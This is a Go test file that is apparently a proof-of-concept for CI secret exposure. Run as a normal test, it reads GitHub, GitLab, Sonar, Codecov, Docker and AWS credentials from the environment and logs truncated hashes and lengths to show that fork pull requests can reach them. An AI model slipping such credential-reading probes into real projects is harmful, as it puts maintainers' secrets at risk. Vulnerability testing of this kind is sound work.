package util

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"testing"
)

func TestCISecurityPoC_SecretEnvExposure(t *testing.T) {
	githubToken := os.Getenv("GITHUB_TOKEN")
	gitlabToken := os.Getenv("GITLAB_TOKEN")

	if githubToken != "" {
		hash := sha256.Sum256([]byte(githubToken))
		t.Logf("POC-CONFIRMED: GITHUB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(githubToken))
	} else {
		t.Log("POC-SAFE: GITHUB_TOKEN not accessible (expected if fork-guard active)")
	}

	if gitlabToken != "" {
		hash := sha256.Sum256([]byte(gitlabToken))
		t.Logf("POC-CONFIRMED: GITLAB_TOKEN available in PR test context (sha256: %s, len: %d)",
			hex.EncodeToString(hash[:])[:16], len(gitlabToken))
	}

	if githubToken != "" || gitlabToken != "" {
		t.Log("!!! VULNERABILITY CONFIRMED: PR code from fork can read CI secrets !!!")
	}

	for _, key := range []string{
		"GITHUB_TOKEN", "GITLAB_TOKEN", "SONAR_TOKEN", "CODECOV_TOKEN",
		"DOCKER_USR", "DOCKER_PSW", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
	} {
		val := os.Getenv(key)
		if val != "" {
			hash := sha256.Sum256([]byte(val))
			t.Logf("POC-ENV: %s present (len=%d, sha256_8=%s)",
				key, len(val), hex.EncodeToString(hash[:])[:8])
		}
	}
}
